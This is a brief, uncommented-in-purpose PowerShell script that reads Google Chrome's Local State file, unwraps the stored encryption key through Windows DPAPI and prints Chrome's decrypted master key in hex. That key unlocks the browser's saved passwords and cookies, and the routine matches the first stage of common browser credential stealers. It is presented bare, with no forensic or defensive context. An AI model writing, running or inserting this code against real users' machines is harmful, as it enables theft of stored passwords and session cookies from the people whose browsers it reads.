Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
public class ProtectedDataWrapper {
    public static byte[] Unprotect(byte[] encryptedData) {
        return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
    }
}
"@ -ReferencedAssemblies "System.Security"

# Path to the Local State file
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"

# Read and parse the Local State file
$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json

# Extract and decode the encrypted key
$encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)

# Remove the DPAPI prefix (first 5 bytes)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

# Decrypt the master key
$masterKey = [ProtectedDataWrapper]::Unprotect($encryptedKey)

# Convert the master key to a hexadecimal string
$masterKeyHex = [BitConverter]::ToString($masterKey) -replace '-', ''

# Output the master key
"Master Key: $masterKeyHex"
